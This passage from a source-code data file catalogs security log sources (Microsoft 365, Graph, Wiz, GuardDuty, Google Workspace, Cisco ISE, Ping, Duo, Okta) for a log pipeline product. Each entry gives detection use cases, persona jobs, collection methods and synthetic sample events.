            { persona: 'Data End User / Analyst', job: 'Investigate data exfiltration via SharePoint/OneDrive by correlating external sharing events with user risk scores and DLP matches' },
            { persona: 'Jack of All Trades', job: 'Detect insider threats by identifying unusual eDiscovery searches, mailbox exports, and Teams guest access from high-risk accounts' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Retain complete M365 audit trail for 13+ months across all workloads to satisfy SOC2/GDPR data handling requirements' },
            { persona: 'Data End User / Analyst', job: 'Generate DLP policy violation reports by workload and user showing sensitive content sharing trends and remediation actions' },
            { persona: 'Team Leader', job: 'Present quarterly compliance posture showing external sharing reduction, DLP match resolution rates, and admin change governance metrics' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter routine Exchange mailbox sync and Teams presence events reducing M365 audit log volume by 55-70% for SIEM delivery' },
            { persona: 'Data Engineer', job: 'Route security-critical operations (permission changes, external sharing, DLP) to SIEM while sending full audit trail to Lake' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure Management Activity API collection via REST Collector with content type subscriptions and pagination within 45 minutes' },
            { persona: 'Data Engineer', job: 'Normalize M365 audit events across workloads (Exchange, SharePoint, Teams, AzureAD) into unified schema for cross-workload correlation' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Office 365 Management Activity API (Cribl REST Collector polling) / Azure Event Hub / Microsoft Graph Security API / Splunk Add-on for O365',
        logFormat: 'JSON via Management Activity API. Content types: Audit.AzureActiveDirectory, Audit.Exchange, Audit.SharePoint, Audit.General, DLP.All. Each event has Operation, UserId, ClientIP, Workload, and workload-specific extended properties.',
        avgEPS: '2,000-50,000 EPS depending on tenant size and workload activity',
        sampleEvent: '{"CreationTime":"2026-06-06T14:32:08","Id":"a1b2c3d4-e5f6-7890-abcd-ef1234567890","Operation":"FileDownloaded","OrganizationId":"12345678-abcd-ef12-3456-7890abcdef12","RecordType":6,"UserKey":"i:0h.f|membership|10032000a1b2c3d4@live.com","UserType":0,"Version":1,"Workload":"OneDrive","ClientIP":"203.0.113.42","UserId":"jperks@cribl.io","ObjectId":"https://cribl-my.sharepoint.com/personal/jperks_cribl_io/Documents/Confidential/Q3-Revenue-Forecast.xlsx","ItemType":"File","SourceFileName":"Q3-Revenue-Forecast.xlsx","SiteUrl":"https://cribl-my.sharepoint.com/personal/jperks_cribl_io/","UserAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64)","EventSource":"SharePoint"}'
      },
      {
        id: 'microsoft-graph',
        name: 'Microsoft Graph API Security & Activity',
        vendor: 'Microsoft',
        description: 'Security alerts, sign-in logs, directory audit events, and risk detections from Microsoft Graph Security API and Azure AD (Entra ID). Consolidates signals across Microsoft Defender for Endpoint, Defender for Identity, Defender for Cloud Apps, Azure AD Identity Protection, and Intune into a unified security graph. Provides correlated incidents, user risk scores, and conditional access evaluations.',
        status: 'available',
        useCases: ['Risky Sign-In Detection', 'Compromised Account Identification', 'Conditional Access Failures', 'MFA Registration Monitoring', 'App Consent Grants', 'Device Compliance Drift', 'Impossible Travel (Entra ID)', 'Privilege Escalation', 'Incident Correlation Across Defender Stack', 'Service Principal Abuse'],
        personas: ['SOC', 'Security Engineering', 'Identity Team', 'Cloud Security', 'Compliance', 'Incident Response', 'M365 Administration'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 8+ detection rules for risky sign-ins, impossible travel, service principal abuse, and conditional access bypass patterns' },
            { persona: 'Data End User / Analyst', job: 'Investigate compromised accounts by correlating Graph risk detections with sign-in anomalies and MFA registration changes' },
            { persona: 'Jack of All Trades', job: 'Detect privilege escalation by identifying role assignment changes paired with anomalous sign-in locations within 10-minute windows' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor conditional access policy effectiveness and device compliance drift rates to maintain zero trust posture across 10K+ identities' },
            { persona: 'Data End User / Analyst', job: 'Track Defender incident correlation quality and mean-time-to-detect across Microsoft security stack signals for SOC performance reporting' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Maintain complete identity risk audit trail with sign-in context for regulatory access review requirements across all Entra ID tenants' },
            { persona: 'Data End User / Analyst', job: 'Generate conditional access enforcement reports showing policy gaps, exempted users, and risk acceptance decisions by department' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter low-risk sign-in events and routine directory audit noise, reducing Graph Security log volume by 50-65% for SIEM' },
            { persona: 'Data Engineer', job: 'Route high-risk alerts and incidents to SIEM in real time while batching sign-in telemetry and audit logs to Lake for investigation' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Microsoft Graph Security API (Cribl REST Collector) / Azure Event Hub (streaming) / Microsoft Graph Activity Logs / Azure Monitor Diagnostic Settings',
        logFormat: 'JSON via Graph API. Entity types: alerts (v2), incidents, signInLogs, auditLogs/directoryAudits, riskDetections, servicePrincipalRiskDetections. Key fields: id, createdDateTime, severity, status, category, userPrincipalName, ipAddress, riskLevel, riskState, conditionalAccessStatus.',
        avgEPS: '1,000-50,000 EPS depending on tenant size and Defender product coverage',
        sampleEvent: '{"id":"alert-12345-abcd","createdDateTime":"2026-06-06T14:32:08Z","severity":"high","status":"new","category":"CredentialAccess","title":"Suspicious sign-in from unfamiliar location","description":"User jperks@cribl.io signed in from an IP address not recently seen for this account","userStates":[{"userPrincipalName":"jperks@cribl.io","riskScore":"85","riskLevel":"high"}],"hostStates":[],"networkConnections":[{"sourceAddress":"203.0.113.99","destinationAddress":"login.microsoftonline.com"}],"vendorInformation":{"provider":"Azure AD Identity Protection","vendor":"Microsoft"},"riskScore":85,"assignedTo":"","conditionalAccessStatus":"notApplied","ipAddress":"203.0.113.99","location":{"city":"Lagos","state":"Lagos","countryOrRegion":"NG"}}'
      },
      {
        id: 'wiz-cloud-security',
        name: 'Wiz Cloud Security (CNAPP)',
        vendor: 'Wiz',
        description: 'Cloud-native application protection platform alerts covering misconfigurations, vulnerabilities, toxic combinations, identity exposure, data exposure, and attack path analysis across AWS, Azure, and GCP. Agentless scanning delivers unified risk findings with full context graph.',
        status: 'available',
        useCases: ['Cloud Misconfiguration Detection', 'Vulnerability Prioritization', 'Toxic Combination Analysis', 'Attack Path Visualization', 'Container Security', 'Identity Exposure Detection', 'Data Exposure Prevention'],
        personas: ['Cloud Security', 'Security Engineering', 'SOC', 'DevSecOps', 'Compliance', 'Platform Engineering'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Correlate Wiz toxic combination findings with runtime signals (CloudTrail, network flows) to identify actively exploitable attack paths versus theoretical exposure' },
            { persona: 'Data End User / Analyst', job: 'Prioritize Wiz issues by combining severity with blast radius (number of downstream resources reachable from the vulnerable asset) to focus remediation' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Generate continuous compliance reports from Wiz findings mapped to CIS, SOC 2, PCI-DSS, and HIPAA frameworks with remediation status tracking' },
            { persona: 'Data End User / Analyst', job: 'Track mean-time-to-remediation for critical cloud misconfigurations and measure drift from security baselines over time' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Route only critical/high severity issues and status changes to SIEM while sending full inventory scans and low-severity findings to Lake for trending — reducing volume by 80-90%' },
            { persona: 'Data Engineer', job: 'Deduplicate Wiz issues that fire on the same resource across multiple scan cycles by tracking issue IDs and only forwarding state transitions' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure Wiz webhook integration or Issues API polling with proper severity filtering and resource context enrichment' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Google Chronicle', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Webhook (push) / REST API (Issues, Audit) / AWS EventBridge / Azure Event Grid',
        logFormat: 'JSON — fields include id, sourceRule, title, severity (CRITICAL/HIGH/MEDIUM/LOW/INFORMATIONAL), status (OPEN/RESOLVED/REJECTED), entitySnapshot (type, name, cloudPlatform, region, subscriptionId), remediation, firstDetectedAt, resolvedAt, dueAt, notes, projects.',
        avgEPS: '100-5,000 EPS (issue-level events are low volume but high context; inventory scan results can spike during full scans)',
        sampleEvent: '{"id":"iss-a1b2c3d4-e5f6-7890","sourceRule":{"id":"rule-public-s3","name":"S3 Bucket Publicly Accessible"},"title":"S3 bucket customer-data-prod is publicly readable","severity":"CRITICAL","status":"OPEN","entitySnapshot":{"id":"arn:aws:s3:::customer-data-prod","type":"bucket","name":"customer-data-prod","cloudPlatform":"AWS","region":"us-east-1","subscriptionExternalId":"123456789012","subscriptionName":"prod-account","tags":{"team":"data-engineering","env":"production"}},"remediation":"Remove public ACL grants and configure bucket policy with explicit deny for non-authenticated principals","firstDetectedAt":"2026-06-16T14:32:08Z","projects":[{"id":"proj-001","name":"Production Infrastructure"}],"notes":[]}'
      },
      {
        id: 'aws-guardduty',
        name: 'AWS GuardDuty Findings',
        vendor: 'Amazon Web Services',
        description: 'Managed threat detection findings from AWS GuardDuty covering reconnaissance, instance compromise, credential compromise, cryptomining, S3 data access anomalies, EKS runtime threats, RDS login anomalies, and Lambda execution anomalies. GuardDuty correlates VPC Flow Logs, DNS logs, CloudTrail events, EKS audit logs, and RDS login activity using machine learning and threat intelligence to generate high-confidence security findings.',
        status: 'available',
        useCases: ['Credential Compromise Detection', 'Cryptomining Detection', 'Reconnaissance Detection', 'Data Exfiltration via S3', 'Container Runtime Threats', 'Malicious IP Communication', 'DNS-Based Data Exfil', 'Unauthorized API Calls', 'RDS Anomalous Login', 'Lambda Backdoor Detection'],
        personas: ['Cloud Security', 'SOC', 'Security Engineering', 'Incident Response', 'Platform Engineering', 'DevSecOps'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Correlate GuardDuty findings with CloudTrail API activity and VPC Flow Logs to build composite detections — e.g., credential compromise finding followed by S3 data access anomaly from same principal within 30 minutes' },
            { persona: 'Data End User / Analyst', job: 'Investigate GuardDuty high-severity findings by pivoting to the underlying evidence sources (CloudTrail events, DNS queries, network flows) to determine blast radius and confirm true positives within 10 minutes' },
            { persona: 'Jack of All Trades', job: 'Enrich GuardDuty findings with account metadata, resource tags, and business context to auto-prioritize findings affecting production accounts with PII data classifications' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor GuardDuty finding volume trends, detector coverage status across accounts/regions, and suppression filter effectiveness to ensure no detection gaps exist in the multi-account organization' },
            { persona: 'Data End User / Analyst', job: 'Track finding resolution velocity by severity and type to measure SOC response effectiveness and identify finding categories requiring automation or suppression tuning' },
            { persona: 'NOC', job: 'Detect GuardDuty detector health issues — regions with disabled detectors, accounts not enrolled, or data sources not contributing — before coverage gaps allow threats to go undetected' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Suppress archived findings and low-severity informational findings (Recon:EC2/PortProbeUnprotectedPort on dev accounts) while routing all medium/high/critical findings to SIEM — reducing finding volume by 40-60%' },
            { persona: 'Data Engineer', job: 'Route high-severity and credential-compromise findings to SIEM for immediate alerting while batching all findings to Lake for trend analysis and compliance reporting' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure EventBridge rule for GuardDuty findings → Kinesis Firehose → Cribl Stream with multi-account aggregation via delegated administrator within 30 minutes' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Google Chronicle', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'EventBridge → Kinesis Firehose / S3 export / Security Hub aggregation / GuardDuty API (Cribl REST Collector)',
        logFormat: 'JSON (GuardDuty Finding format). Key fields: id, type, severity (0-10 numeric), title, description, accountId, region, resource (instanceDetails, accessKeyDetails, s3BucketDetails, eksClusterDetails), service (action, evidence, additionalInfo), updatedAt, createdAt.',
        avgEPS: '100-10,000 findings/hour depending on account count and threat landscape (findings are pre-correlated, not raw logs)',
        sampleEvent: '{"schemaVersion":"2.0","id":"a1b2c3d4-5678-90ab-cdef-111122223333","type":"UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS","severity":8.0,"title":"Credentials for instance i-0abc123 are being used from an external IP address","description":"AWS API calls from instance role credentials are being made from IP 203.0.113.99 which is not associated with EC2 infrastructure in account 123456789012.","accountId":"123456789012","region":"us-east-1","resource":{"resourceType":"AccessKey","accessKeyDetails":{"accessKeyId":"AKIA1234567890EXAMPLE","principalId":"AROA1234567890:i-0abc123","userType":"Role","userName":"prod-api-role"}},"service":{"action":{"actionType":"AWS_API_CALL","awsApiCallAction":{"api":"GetObject","serviceName":"s3.amazonaws.com","remoteIpDetails":{"ipAddressV4":"203.0.113.99","country":{"countryName":"Russia"},"city":{"cityName":"Moscow"}}}},"evidence":{"threatIntelligenceDetails":[{"threatListName":"ProofPoint","threatNames":["Known Malicious IP"]}]},"count":47,"firstSeen":"2026-06-17T12:00:00Z","lastSeen":"2026-06-17T14:32:08Z"},"updatedAt":"2026-06-17T14:32:08Z","createdAt":"2026-06-17T12:15:00Z"}'
      },
      {
        id: 'google-workspace-audit',
        name: 'Google Workspace Audit Logs',
        vendor: 'Google',
        description: 'Enterprise audit logs from Google Workspace (formerly G Suite) capturing user and admin activity across Gmail, Drive, Calendar, Admin Console, Login, SAML, OAuth token grants, Groups, and Chrome OS. Delivered via the Reports API or BigQuery export. Covers authentication events, file sharing and access, admin configuration changes, DLP policy matches, and third-party OAuth app authorization.',
        status: 'available',
        useCases: ['Account Takeover Detection', 'OAuth App Abuse', 'Data Exfiltration via Drive', 'Suspicious Login Detection', 'Admin Privilege Escalation', 'External Sharing Monitoring', 'SAML/SSO Attack Detection', 'DLP Policy Violations', 'License Utilization', 'Shadow IT Discovery'],
        personas: ['SOC', 'Security Engineering', 'Identity Team', 'Compliance', 'IT Administration', 'Data Protection', 'Incident Response'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build detections for account takeover sequences — suspicious login followed by OAuth token grant, mail forwarding rule creation, and external file sharing within a single session' },
            { persona: 'Data End User / Analyst', job: 'Investigate OAuth app abuse by identifying third-party apps granted sensitive scopes (Gmail read, Drive full access) from suspicious login sessions or geographic anomalies' },
            { persona: 'Jack of All Trades', job: 'Detect data exfiltration via Google Drive by identifying mass file downloads, ownership transfers to external accounts, and sharing permission changes to "Anyone with the link" on sensitive folders' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor Google Workspace service health by tracking API error rates, login failure trends, and admin console changes that could impact user productivity' },
            { persona: 'Data End User / Analyst', job: 'Track license utilization by correlating login activity with licensed users to identify dormant accounts and optimize licensing spend' },
            { persona: 'NOC', job: 'Detect Google Workspace outage impact by monitoring login success rates and API availability across organizational units before Google publishes status page updates' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter high-volume Drive view events and Calendar read operations (often 60-70% of audit volume) while preserving all login, admin, sharing, and OAuth events for security analysis' },
            { persona: 'Data Engineer', job: 'Route login failures, OAuth grants, admin changes, and DLP matches to SIEM while batching full Drive and Gmail audit logs to Lake for compliance retention' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Maintain complete audit trail of all admin actions, permission changes, and data access events for SOC 2 and GDPR data processing requirements with 13+ month retention' },
            { persona: 'Data End User / Analyst', job: 'Generate compliance reports showing all external sharing events, third-party OAuth grants with sensitive scopes, and admin privilege changes within any audit window' }
          ]},
          { category: 'Data Onboarding', jobs: [
            { persona: 'Data Onboarder', job: 'Configure Google Workspace Reports API collection via Cribl REST Collector with service account authentication, or BigQuery export for historical data — operational within 30 minutes' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['Splunk', 'CrowdStrike NG SIEM', 'Microsoft Sentinel', 'Elastic Security', 'Google Chronicle', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Reports API (Cribl REST Collector) / BigQuery export / Pub/Sub (real-time) / Google Workspace Alert Center API',
        logFormat: 'JSON (Reports API). Key fields: id.time, id.applicationName (login, drive, admin, token, saml, groups_enterprise, chrome), actor.email, actor.profileId, events[].type, events[].name, events[].parameters[]. Application-specific event names: login_success, login_failure, authorize, revoke, change_document_access_scope, CREATE_ROLE, ASSIGN_ROLE.',
        avgEPS: '5,000-200,000 EPS depending on organization size and application usage (Drive view/edit events dominate volume)',
        sampleEvent: '{"kind":"admin#reports#activity","id":{"time":"2026-06-17T14:32:08.000Z","uniqueQualifier":"123456789","applicationName":"token","customerId":"C0A0B1C2D3"},"actor":{"email":"mthompson@cribl.io","profileId":"112233445566778899"},"events":[{"type":"auth","name":"authorize","parameters":[{"name":"client_id","value":"abcdef123456.apps.googleusercontent.com"},{"name":"app_name","value":"Suspicious Chrome Extension"},{"name":"scope","multiValue":["https://mail.google.com/","https://www.googleapis.com/auth/drive"]},{"name":"client_type","value":"WEB"}]}],"ipAddress":"203.0.113.99","ownerDomain":"cribl.io"}'
      }
    ]
  },
  {
    category: 'Identity',
    icon: '🔑',
    sources: [
      {
        id: 'cisco-ise',
        name: 'Cisco ISE (Identity Services Engine)',
        vendor: 'Cisco',
        description: 'Network access control and identity event logs from Cisco Identity Services Engine (ISE). Captures RADIUS authentication/authorization decisions, 802.1X wired/wireless authentication, MAB (MAC Authentication Bypass), posture assessment results, guest access events, profiling classifications, TrustSec SGT assignments, and admin audit trails. Events delivered via syslog or pxGrid context sharing.',
        status: 'available',
        useCases: ['Network Access Control', 'Unauthorized Device Detection', '802.1X Authentication Monitoring', 'Guest Access Tracking', 'Posture Compliance Enforcement', 'BYOD Visibility', 'Endpoint Profiling', 'TrustSec Policy Monitoring', 'RADIUS Health Monitoring', 'VPN Authentication'],
        personas: ['SOC', 'Security Engineering', 'Network Security', 'Identity Team', 'NOC', 'Network Engineering', 'Compliance'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 6+ detection rules for unauthorized device connections, authentication failures from rogue endpoints, and posture non-compliance patterns' },
            { persona: 'Data End User / Analyst', job: 'Investigate 802.1X authentication anomalies by correlating ISE decisions with endpoint profiling and TrustSec SGT assignments' },
            { persona: 'Jack of All Trades', job: 'Detect BYOD policy violations by identifying unmanaged devices receiving corporate network access via MAB bypass within 5 minutes' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Maintain complete NAC authentication audit trail with posture evidence for 12+ months to satisfy PCI-DSS network segmentation requirements' },
            { persona: 'Data End User / Analyst', job: 'Generate network access compliance reports showing endpoint posture pass/fail rates and remediation timelines by location' },
            { persona: 'Team Leader', job: 'Present TrustSec segmentation coverage metrics showing percentage of network traffic with SGT enforcement across all access switches' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor RADIUS server health and authentication latency to detect ISE node degradation before access failures exceed 1% threshold' },
            { persona: 'Data End User / Analyst', job: 'Track endpoint profiling accuracy and guest access usage patterns to optimize NAC policy rules and reduce help desk tickets by 30%' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter periodic RADIUS accounting updates and keepalive events, reducing ISE log volume by 45-60% while preserving all auth decisions' },
            { persona: 'Data Engineer', job: 'Route authentication failures and posture violations to SIEM while sending successful auth events to Lake for trend analysis' }
          ]}
        ],
        criblProducts: ['Stream', 'Edge', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Syslog (TCP/UDP from ISE MnT nodes) / pxGrid (HTTPS pub/sub for real-time context) / ISE REST API / Cisco DNA Center integration',
        logFormat: 'Cisco ISE syslog with CSV-structured attribute-value pairs. Key message codes: 5200 (auth success), 5400 (auth failure), 5440 (endpoint profiled), 3000-3999 (posture), 60000+ (admin audit). Fields: UserName, CallingStationID (MAC), FramedIPAddress, NAS-IP, NetworkDeviceName, AuthorizationPolicyMatchedRule, PostureStatus, EndpointProfile, SGT.',
        avgEPS: '2,000-50,000 EPS depending on device count and auth frequency',
        sampleEvent: 'Jun 06 14:32:08 ISE-PSN-01 CISE_Passed_Authentications 0000012345 1 0 2026-06-06 14:32:08.123 +00:00 0012345678 5200 NOTICE Passed-Authentication: Authentication succeeded, ConfigVersionId=145, Device IP Address=10.0.1.1, DestinationIPAddress=10.0.1.50, DestinationPort=1812, UserName=jperks@cribl.io, Protocol=Radius, RequestLatency=35, NetworkDeviceName=SW-ACCESS-01, Type=Authentication, AuthenticationIdentityStore=ActiveDirectory, AuthorizationPolicyMatchedRule=Corp-Wired-FullAccess, SelectedAccessService=Default Network Access, SelectedAuthorizationProfiles=PermitAccess, PostureStatus=Compliant, EndPointMACAddress=00:1A:2B:3C:4D:5E, EndPointMatchedProfile=Windows10-Workstation, ISEPolicySetName=Wired-Dot1X, FramedIPAddress=10.1.2.100, SGT=Corp-Users(15), Location=Building-A/Floor-2/IDF-2A'
      },
      {
        id: 'ping-identity',
        name: 'Ping Identity / PingOne Logs',
        vendor: 'Ping Identity',
        description: 'Authentication, authorization, and directory event logs from PingOne, PingFederate, and PingAccess. Captures SSO transactions, adaptive MFA challenges, session management, token issuance, API gateway policy decisions, and admin configuration changes in structured JSON format.',
        status: 'available',
        useCases: ['Impossible Travel Detection', 'MFA Bypass Attempts', 'Token Replay Attacks', 'Session Hijacking', 'OAuth Abuse', 'Federated Auth Failures', 'SSO Outage Monitoring', 'Auth Latency Tracking', 'Policy Change Auditing', 'License Usage Monitoring'],
        personas: ['Security Engineering', 'SOC', 'Identity Team', 'Platform Engineering', 'Compliance', 'Incident Response'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 6+ detection rules for impossible travel, MFA bypass attempts, token replay attacks, and OAuth abuse patterns across federated SSO' },
            { persona: 'Data End User / Analyst', job: 'Investigate session hijacking indicators by correlating authentication events with IP geolocation shifts and device fingerprint changes' },
            { persona: 'Jack of All Trades', job: 'Detect credential compromise by identifying authentication failures followed by successful logins from different geographic regions within 30 minutes' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor SSO authentication latency p95/p99 and federation endpoint health to detect PingFederate degradation within 2-minute windows' },
            { persona: 'Data End User / Analyst', job: 'Track MFA challenge success rates and adaptive authentication risk score distributions to optimize policy thresholds' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Maintain complete SSO authentication audit trail with MFA evidence for 13+ months to satisfy SOC2 access control requirements' },
            { persona: 'Data End User / Analyst', job: 'Generate federated authentication reports showing policy change history, admin actions, and license utilization by application' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Suppress repetitive session refresh and token validation events, reducing Ping Identity log volume by 50-65% for SIEM delivery' },
            { persona: 'Data Engineer', job: 'Route authentication failures and high-risk events to SIEM while sending successful SSO transactions to Lake for capacity planning' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'PingOne Webhook (HTTPS POST to Cribl HTTP source) / PingFederate Audit Log API / S3 Export / Syslog (CEF)',
        sampleEvent: '{"id":"evt-a1b2c3d4","recordedAt":"2026-06-06T14:32:08.000Z","action":{"type":"USER.LOGIN","description":"User authentication"},"actors":{"user":{"id":"usr-123","name":"jperks@cribl.io","type":"USER"}},"resources":[{"id":"app-456","name":"Salesforce","type":"APPLICATION"}],"result":{"status":"SUCCESS","description":"Authentication successful"},"riskLevel":"LOW","riskScore":15,"authenticationMethod":"MFA_PUSH","ipAddress":"203.0.113.42","userAgent":"Mozilla/5.0","geolocation":{"city":"Austin","state":"Texas","country":"US","latitude":30.2672,"longitude":-97.7431}}'
      },
      {
        id: 'duo-mfa',
        name: 'Duo Security Logs',
        vendor: 'Cisco (Duo)',
        description: 'Multi-factor authentication event logs from Duo Security including authentication attempts, push notifications, phone call verifications, hardware token usage, bypass codes, admin actions, and telephony events. Accessed via the Duo Admin API or Duo Trust Monitor.',
        status: 'available',
        useCases: ['MFA Fatigue/Push Spam Detection', 'Denied Auth Monitoring', 'Bypass Code Usage', 'Impossible Travel', 'New Device Enrollment', 'Auth Method Downgrade', 'Admin Abuse Detection', 'MFA Coverage Gap Reporting', 'Auth Latency Monitoring', 'Telephony Fraud Detection'],
        personas: ['Security Engineering', 'SOC', 'Identity Team', 'Compliance', 'Incident Response', 'Help Desk'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 6+ detection rules for MFA fatigue/push spam (5+ denied pushes in 60s), bypass code usage, and auth method downgrade attacks' },
            { persona: 'Data End User / Analyst', job: 'Investigate MFA denial clusters by correlating push spam patterns with source IP reputation and device enrollment anomalies' },
            { persona: 'Jack of All Trades', job: 'Detect impossible travel by identifying MFA approvals from geographically distant locations within physiologically impossible timeframes' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Maintain complete MFA authentication audit trail with device context for 12+ months to satisfy SOC2 multi-factor authentication requirements' },
            { persona: 'Data End User / Analyst', job: 'Generate MFA coverage gap reports showing applications and users without enforced second-factor authentication by department' },
            { persona: 'Team Leader', job: 'Present MFA adoption metrics showing enrollment completion rates, auth method distribution, and telephony fraud reduction quarter-over-quarter' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor Duo push delivery latency and telephony callback success rates to detect authentication infrastructure issues within 3 minutes' },
            { persona: 'Data End User / Analyst', job: 'Track new device enrollment patterns and auth method preferences to optimize MFA user experience and reduce help desk escalations by 25%' }
          ]},
          { category: 'Cost Optimization', jobs: [
            { persona: 'Data Optimizer', job: 'Filter successful authentication events for low-risk applications and deduplicate telephony events, reducing Duo log volume by 40-55%' },
            { persona: 'Data Engineer', job: 'Route denied authentications and Trust Monitor alerts to SIEM while sending successful auth telemetry to Lake for trend analysis' }
          ]}
        ],
        criblProducts: ['Stream', 'Lake', 'Search', 'Guard'],
        destinations: ['CrowdStrike NG SIEM', 'Splunk', 'Microsoft Sentinel', 'Elastic Security', 'Cribl Lake', 'Amazon S3'],
        collectionMethod: 'Duo Admin API (Polling via Cribl REST Collector) / Duo Trust Monitor Webhook / SIEM Connector',
        sampleEvent: '{"timestamp":1717680008,"device":"555-123-4567","factor":"duo_push","integration":"VPN Gateway","ip":"203.0.113.42","location":{"city":"Austin","state":"Texas","country":"United States"},"new_enrollment":false,"reason":"user_approved","result":"success","txid":"tx-abc123","user":{"name":"jperks@cribl.io","key":"DUSR1234567890"},"access_device":{"os":"Windows 10","browser":"Chrome 125.0","is_encryption_enabled":true,"is_firewall_enabled":true},"application":{"name":"Corporate VPN","key":"DAPP1234567890"},"auth_device":{"name":"iPhone 15","os":"iOS 18.1"},"email":"jperks@cribl.io","event_type":"authentication","isotimestamp":"2026-06-06T14:32:08+00:00"}'
      },
      {
        id: 'okta-system-logs',
        name: 'Okta System Logs',
        vendor: 'Okta',
        description: 'Identity platform event logs capturing authentication, authorization, MFA challenges, admin actions, application access, and policy changes via the Okta System Log API. Events follow a structured JSON format with actor, target, client, and outcome objects.',
        status: 'available',
        useCases: ['Impossible Travel', 'MFA Fatigue Detection', 'Credential Stuffing', 'Suspicious Logins', 'Privilege Escalation', 'Auth Failures', 'SSO Outages', 'Application Access Issues', 'Account Lockout Monitoring', 'Policy Change Tracking'],
        personas: ['Security Engineering', 'SOC', 'Identity Team', 'Platform Engineering', 'Compliance', 'Incident Response'],
        jobsToBeDone: [
          { category: 'Security Detection', jobs: [
            { persona: 'Data Content Creator', job: 'Build 8+ detection rules for MFA fatigue attacks, credential stuffing, impossible travel, and suspicious app consent grants with <3 min alerting' },
            { persona: 'Data End User / Analyst', job: 'Investigate account compromise by correlating failed authentication sequences with subsequent successful logins from new locations or devices' },
            { persona: 'Jack of All Trades', job: 'Detect privilege escalation by identifying admin role assignments paired with policy changes from recently compromised accounts' }
          ]},
          { category: 'Operational Visibility', jobs: [
            { persona: 'Platform Operator', job: 'Monitor Okta org health including API rate limits, SSO latency, and authentication success rates to maintain 99.9% IdP availability' },
            { persona: 'Data End User / Analyst', job: 'Track application access patterns and account lockout trends to identify integration issues and reduce authentication-related support tickets by 30%' }
          ]},
          { category: 'Compliance & Governance', jobs: [
            { persona: 'Platform Administrator', job: 'Retain complete Okta authentication and admin audit trail for 13+ months with tamper-proof storage for regulatory compliance' },
            { persona: 'Data End User / Analyst', job: 'Generate identity governance reports showing policy changes, admin actions, and application assignment modifications by timeframe and actor' }
          ]},
          { category: 'Cost Optimization', jobs: [
